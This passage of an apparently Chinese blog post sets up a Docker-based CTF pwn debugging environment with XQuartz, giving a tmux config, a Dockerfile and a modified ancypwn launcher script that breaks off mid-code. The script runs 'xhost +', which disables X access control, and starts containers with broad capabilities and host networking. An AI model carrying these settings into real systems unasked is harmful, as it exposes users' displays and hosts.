class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> -g prefix C<span class="_">-a</span></span><br><span class="line"><span class="built_in">set</span> -g default-terminal <span class="string">&quot;screen-256color&quot;</span></span><br><span class="line">set-window-option -g mode-keys vi</span><br><span class="line"><span class="built_in">bind</span> h select-pane -L</span><br><span class="line"><span class="built_in">bind</span> j select-pane -D</span><br><span class="line"><span class="built_in">bind</span> k select-pane -U</span><br><span class="line"><span class="built_in">bind</span> l select-pane -R</span><br><span class="line">unbind %</span><br><span class="line"><span class="built_in">bind</span> \ split-window -h</span><br><span class="line"><span class="built_in">bind</span> - split-window -v</span><br><span class="line"><span class="built_in">set</span> -g mouse-utf8 on</span><br><span class="line"><span class="built_in">set</span> -g mouse on</span><br><span class="line"></span><br><span class="line">unbind C-b</span><br><span class="line"></span><br><span class="line"><span class="comment"># bind a reload key</span></span><br><span class="line"><span class="built_in">bind</span> R source-file ~/.tmux.conf ; display-message <span class="string">&quot;Config reloaded..&quot;</span></span><br><span class="line"></span><br><span class="line">set-option -g mouse on</span><br></pre></td></tr></table></figure><p>其实这样看起来也不错啦<del>~</del></p><p>由于后来我用起了 Docker 然后我就开始想能不能在 docker 里往外面弹一个 gdb 调试窗口…然后就有了这个想法：</p><h3 id="XQuartz"><a href="#XQuartz" class="headerlink" title="XQuartz"></a>XQuartz</h3><p>首先  我们需要 <a href="https://www.xquartz.org/">XQuartz</a> </p><p><code>brew cask install xquartz</code></p><p>XQuartz 主要作为一个新终端的承载器和 host 机器和 Docker 的通讯器。</p><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><p>准备好你的Docker 由于我这主要用来调试一些 Pwn 题，所以我会有自己的依赖支持，比如 Pwntools 、onegadget 之类的东西…安装啥的我就不说了 环境可参考我的 Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Apt packages</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash">  sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash">  apt-get clean</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    DEBIAN_FRONTEND=noninteractive apt-get install -y \</span></span><br><span class="line"><span class="bash">    git nasm  python \</span></span><br><span class="line"><span class="bash">    build-essential \</span></span><br><span class="line"><span class="bash">    python-dev python-pip python-setuptools \</span></span><br><span class="line"><span class="bash">    libc6-dbg \</span></span><br><span class="line"><span class="bash">    libc6-dbg:i386 \</span></span><br><span class="line"><span class="bash">    gcc-multilib \</span></span><br><span class="line"><span class="bash">    gdb-multiarch \</span></span><br><span class="line"><span class="bash">    gcc \</span></span><br><span class="line"><span class="bash">    wget \</span></span><br><span class="line"><span class="bash">    curl \</span></span><br><span class="line"><span class="bash">    glibc-source \</span></span><br><span class="line"><span class="bash">    cmake \</span></span><br><span class="line"><span class="bash">    python-capstone \</span></span><br><span class="line"><span class="bash">    socat \</span></span><br><span class="line"><span class="bash">    netcat \</span></span><br><span class="line"><span class="bash">    ruby \</span></span><br><span class="line"><span class="bash">    lxterminal \</span></span><br><span class="line"><span class="bash">    fish</span></span><br><span class="line">    <span class="comment"># apt-get clean &amp;&amp; \</span></span><br><span class="line">    <span class="comment"># rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/* &amp;&amp; \</span></span><br><span class="line">    <span class="comment"># cd ~ &amp;&amp; tar -xvf /usr/src/glibc/glibc-2.23.tar.xz</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python/ruby packages &amp; gdb-plugin</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install --no-cache-dir pwntools ropper ancypatch swpwn &amp;&amp; \</span></span><br><span class="line"><span class="bash">    gem install one_gadget &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># git installaing package</span></span><br><span class="line"><span class="comment"># RUN cd ~/ &amp;&amp; \</span></span><br><span class="line"><span class="comment">#     git clone https://github.com/pwndbg/pwndbg.git &amp;&amp; \</span></span><br><span class="line"><span class="comment">#     cd ~/pwndbg/ &amp;&amp; ./setup.sh &amp;&amp; \</span></span><br><span class="line"><span class="comment">#     rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> ~/ &amp;&amp; \</span></span><br><span class="line"><span class="bash">    git <span class="built_in">clone</span> https://github.com/longld/peda.git &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">echo</span> <span class="string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> ~/ &amp;&amp; \</span></span><br><span class="line"><span class="bash">    git <span class="built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git &amp;&amp; \</span></span><br><span class="line"><span class="bash">    cp ~/Pwngdb/.gdbinit ~/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">&quot;/pwn&quot;</span>]</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /pwn</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;/bin/bash&quot;</span>]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Go"><a href="#Go" class="headerlink" title="Go!"></a>Go!</h1><p>在终端里运行 XQuartz 并设置：</p><p><code>open -a XQuartz</code></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20181210234056.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20181210234056.png"></a></p><h3 id="Set-run-docker-script"><a href="#Set-run-docker-script" class="headerlink" title="Set run docker script"></a>Set run docker script</h3><p>这里我选择一个轻量的终端：<strong>lxterminal</strong> , 在Docker 里安装这个终端（Dockerfile 里已经有），然后获取当前 HOST 机器的 IP</p><p><code>ip=$(ifconfig en0 | grep inet | awk &#39;$1==&quot;inet&quot; &#123;print $2&#125;&#39;)</code></p><p>接着只要设置容器内环境变量即可：</p><p><code>docker run -d --name pwn -e DISPLAY=$ip:0 -v /tmp/.X11-unix:/tmp/.X11-uni</code></p><p>当然这里咱们可以选择用脚本一键管理 ： <a href="https://github.com/WinMin/ancypwn/blob/master/ancypwn.py">ancypwn</a></p><p>此外在 Python script 上还得加上 <code>context.terminal = [&quot;lxterminal&quot;, &quot;-e&quot;]</code></p><p>或者我这里进行了轻量魔改，脚本见最后，先看一眼效果：</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/gdb-windows.gif" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/gdb-windows.gif"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess <span class="keyword">as</span> sp</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> distutils.dir_util <span class="keyword">import</span> mkpath</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EXIST_FLAG = <span class="string">&#x27;/tmp/ancypwn.id&#x27;</span></span><br><span class="line">SUPPORTED_UBUNTU_VERSION = [</span><br><span class="line"><span class="comment">#    &#x27;14.04&#x27;, Still many issues to be solved (version problems mostly)</span></span><br><span class="line">    <span class="string">&#x27;16.04&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;18.10&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;18.04&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">client = docker.from_env()</span><br><span class="line">container = client.containers</span><br><span class="line">image = client.images</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InstallationError</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnsupportedUbuntuVersion</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AlreadyRuningException</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotRunningException</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ColorWrite</span>(<span class="params">object</span>):</span></span><br><span class="line">    COLOR_SET = &#123;</span><br><span class="line">            <span class="string">&#x27;END&#x27;</span>: <span class="string">&#x27;\033[0m&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;yellow&#x27;</span>: <span class="string">&#x27;\033[38;5;226m&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;red&#x27;</span>: <span class="string">&#x27;\033[31m&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;blue&#x27;</span>: <span class="string">&#x27;\033[34m&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;magenta&#x27;</span>: <span class="string">&#x27;\033[35m&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;cyan&#x27;</span>: <span class="string">&#x27;\033[36m&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">color_write</span>(<span class="params">content, color</span>):</span></span><br><span class="line">        print(ColorWrite.COLOR_SET[color] + content + ColorWrite.COLOR_SET[<span class="string">&#x27;END&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">colorwrite_init</span>():</span></span><br><span class="line">    <span class="keyword">for</span> color <span class="keyword">in</span> ColorWrite.COLOR_SET:</span><br><span class="line">        <span class="comment"># Use default value for lambda to avoid lazy capture of closure</span></span><br><span class="line">        setattr(ColorWrite, color, staticmethod(<span class="keyword">lambda</span> x, color=color: ColorWrite.color_write(x, color)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Static initialize ColorWrite</span></span><br><span class="line">colorwrite_init()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_args</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parses commandline arguments</span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        args -- argparse namespace, contains the parsed arguments</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&quot;Anciety&#x27;s pwn environment&quot;</span></span><br><span class="line">    )</span><br><span class="line">    subparsers = parser.add_subparsers(</span><br><span class="line">        help=<span class="string">&#x27;Actions you can take&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    run_parser = subparsers.add_parser(</span><br><span class="line">        <span class="string">&#x27;run&#x27;</span>,</span><br><span class="line">        help=<span class="string">&#x27;run a pwn thread&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    run_parser.add_argument(</span><br><span class="line">        <span class="string">&#x27;directory&#x27;</span>,</span><br><span class="line">        type=str,</span><br><span class="line">        help=<span class="string">&#x27;The directory which contains your pwn challenge&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    run_parser.add_argument(</span><br><span class="line">        <span class="string">&#x27;--ubuntu&#x27;</span>,</span><br><span class="line">        type=str,</span><br><span class="line">        help=<span class="string">&#x27;The version of ubuntu to open&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    run_parser.set_defaults(func=run_pwn)</span><br><span class="line"></span><br><span class="line">    run_parser.add_argument(</span><br><span class="line">        <span class="string">&#x27;--priv&#x27;</span>,</span><br><span class="line">        action=<span class="string">&#x27;store_true&#x27;</span>,</span><br><span class="line">        help=<span class="string">&#x27;privileged boot, so you can use something like kvm&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    attach_parser = subparsers.add_parser(</span><br><span class="line">        <span class="string">&#x27;attach&#x27;</span>,</span><br><span class="line">        help=<span class="string">&#x27;attach to running thread&#x27;</span>,</span><br><span class="line">    )</span><br><span class="line">    attach_parser.set_defaults(func=attach_pwn)</span><br><span class="line"></span><br><span class="line">    end_parser = subparsers.add_parser(</span><br><span class="line">        <span class="string">&#x27;end&#x27;</span>,</span><br><span class="line">        help=<span class="string">&#x27;end a running thread&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    end_parser.set_defaults(func=end_pwn)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> vars(args) != &#123;&#125;:</span><br><span class="line">        args.func(args)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parser.print_usage()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_terminal_size</span>():</span></span><br><span class="line">    p = sp.Popen(<span class="string">&#x27;tput cols&#x27;</span>, shell=<span class="literal">True</span>, stdout=sp.PIPE)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_print_warning</span>():</span></span><br><span class="line">        print(<span class="string">&#x27;Warning: Unable to get terminal size, you need to specify terminal size &#x27;</span> +</span><br><span class="line">              <span class="string">&#x27;manually or your command line may behave strangely&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> p.returncode != <span class="number">0</span>:</span><br><span class="line">        _print_warning()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    cols = int(p.stdout)</span><br><span class="line">    p = sp.Popen(<span class="string">&#x27;tput lines&#x27;</span>, shell=<span class="literal">True</span>, stdout=sp.PIPE)</span><br><span class="line">    <span class="keyword">if</span> p.returncode != <span class="number">0</span>:</span><br><span class="line">        _print_warning()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    rows = int(p.stdout)</span><br><span class="line">    <span class="keyword">return</span> cols, rows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_read_container_name</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(EXIST_FLAG):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Pwn thread is not running&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    container_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> open(EXIST_FLAG, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> flag:</span><br><span class="line">        container_name = flag.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> container_name == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        os.remove(EXIST_FLAG)</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Meta info corrupted, or unable to read saved info. &#x27;</span> + \</span><br><span class="line">                <span class="string">&#x27;Cleaning corrupted meta-info, please shutdown container manually&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> container_name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_attach_interactive</span>(<span class="params">name</span>):</span></span><br><span class="line">    cols, rows = _get_terminal_size()</span><br><span class="line">    <span class="keyword">if</span> rows <span class="keyword">and</span> cols:</span><br><span class="line">        cmd = <span class="string">&quot;docker exec -it &#123;&#125; bash -c \&quot;&#123;&#125;\&quot;&quot;</span>.format(</span><br><span class="line">            name,</span><br><span class="line">            <span class="string">&#x27;stty cols &#123;&#125; &amp;&amp; stty rows &#123;&#125; &amp;&amp; bash&#x27;</span>.format(</span><br><span class="line">                cols,</span><br><span class="line">                rows,</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd = <span class="string">&quot;docker exec -it &#123;&#125; &#x27;/bin/bash&#x27;&quot;</span>.format(</span><br><span class="line">            name,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    ColorWrite.yellow(</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    ______                   _____    __   ___       </span></span><br><span class="line"><span class="string">    |   __ \.--.--.--..-----.|     |_ |__|.&#x27;  _|.-----.</span></span><br><span class="line"><span class="string">    |    __/|  |  |  ||     ||       ||  ||   _||  -__|</span></span><br><span class="line"><span class="string">    |___|   |________||__|__||_______||__||__|  |_____|</span></span><br><span class="line"><span class="string">                             </span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    os.system(cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_pwn</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Runs a pwn thread</span></span><br><span class="line"><span class="string">    Just sets needed docker arguments and run it</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.ubuntu:</span><br><span class="line">        ubuntu = <span class="string">&#x27;16.04&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># check for unsupported ubuntu version</span></span><br><span class="line">        <span class="keyword">if</span> args.ubuntu <span class="keyword">not</span> <span class="keyword">in</span> SUPPORTED_UBUNTU_VERSION:</span><br><span class="line">            <span class="keyword">raise</span> UnsupportedUbuntuVersion(<span class="string">&#x27;version %s not supported!&#x27;</span> % args.ubuntu )</span><br><span class="line">        ubuntu = args.ubuntu</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.directory.startswith(<span class="string">&#x27;~&#x27;</span>) <span class="keyword">and</span> \</span><br><span class="line">            <span class="keyword">not</span> args.directory.startswith(<span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">                <span class="comment"># relative path</span></span><br><span class="line">        args.directory = os.path.abspath(args.directory)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(args.directory):</span><br><span class="line">        <span class="keyword">raise</span> IOError(<span class="string">&#x27;No such directory&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(EXIST_FLAG):</span><br><span class="line">        <span class="keyword">raise</span> AlreadyRuningException(<span class="string">&#x27;Another pwn thread is already running&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    privileged = <span class="literal">True</span> <span class="keyword">if</span> args.priv <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># First we need a running thread in the background, to hold existence</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.system(<span class="string">&#x27;xhost +&#x27;</span>)</span><br><span class="line">        idx = os.popen(<span class="string">&#x27;ifconfig en0&#x27;</span>).read().find(<span class="string">&#x27;inet &#x27;</span>)</span><br><span class="line">        ip = os.popen(<span class="string">&#x27;ifconfig en0&#x27;</span>).read()[idx+<span class="number">5</span>:idx+<span class="number">19</span>]</span><br><span class="line">        running_container = container.run(</span><br><span class="line">            <span class="string">&#x27;swpwn:&#123;&#125;&#x27;</span>.format(ubuntu),</span><br><span class="line">            <span class="string">&#x27;/bin/bash&#x27;</span>,</span><br><span class="line">            cap_add=[<span class="string">&#x27;SYS_ADMIN&#x27;</span>, <span class="string">&#x27;SYS_PTRACE&#x27;</span>],</span><br><span class="line">            detach=<span class="literal">True</span>,</span><br><span class="line">            tty=<span class="literal">True</span>,</span><br><span class="line">            volumes=&#123;</span><br><span class="line">                os.path.expanduser(args.directory) : &#123;</span><br><span class="line">                    <span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/pwn&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                os.path.expanduser(<span class="string">&#x27;~/.Xauthority&#x27;</span>) : &#123;</span><br><span class="line">                    <span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/root/.Xauthority&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                os.path.expanduser(<span class="string">&#x27;/tmp/.X11-unix&#x27;</span>) : &#123;</span><br><span class="line">                    <span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/tmp/.X11-unix&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            privileged=privileged,</span><br><span class="line">            network_mode=<span class="string">&#x27;host&#x27;</span>,</span><br><span class="line">            environment=&#123;</span><br><span class="line">                <span class="string">&#x27;DISPLAY&#x27;</span>: ip+<span class="string">&#x27;:0&#x27;</span></span><br><span class="line">                